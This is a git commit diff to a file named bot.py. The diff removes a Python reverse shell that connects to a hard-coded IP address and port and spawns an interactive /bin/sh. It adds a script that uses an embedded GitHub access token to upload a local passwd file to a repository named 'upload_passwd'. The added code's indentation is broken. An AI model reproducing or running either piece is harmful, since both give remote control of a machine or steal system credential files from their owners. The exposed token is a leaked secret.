2da83e7147711b907b6d1e330b90d9561530d98d
Oxitocinaa <144260303+Oxitocinaa@users.noreply.github.com>
2023-09-07 16:01:55 +0200

    bot.py

--- bot.py
+++ bot.py
@@ -1,8 +1,26 @@
 def run():
-  import socket,subprocess,os;
-  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-  s.connect(("10.34.23.4",777));
-  os.dup2(s.fileno(),0); 
-  os.dup2(s.fileno(),1); 
-  os.dup2(s.fileno(),2);
-  p=subprocess.call(["/bin/sh","-i"]);
+  from github import Github
+import os
+
+token = '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'
+usuario = 'Oxitocinaa'
+repositorio = 'upload_passwd'
+
+# Ruta local del archivo que deseas subir
+archivo_local = 'etc/passwd.txt'
+
+# Rama en la que deseas realizar la carga
+rama = 'main'
+
+# Crea una instancia de la clase Github con tu token
+g = Github(token)
+
+# Obtiene el repositorio
+repo = g.get_user(usuario).get_repo(repositorio)
+
+# Sube el archivo al repositorio
+with open(archivo_local, 'rb') as archivo:
+    contenido = archivo.read()
+    repo.create_file(archivo_local, f"Commit desde script", contenido, branch=rama)
+
+print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
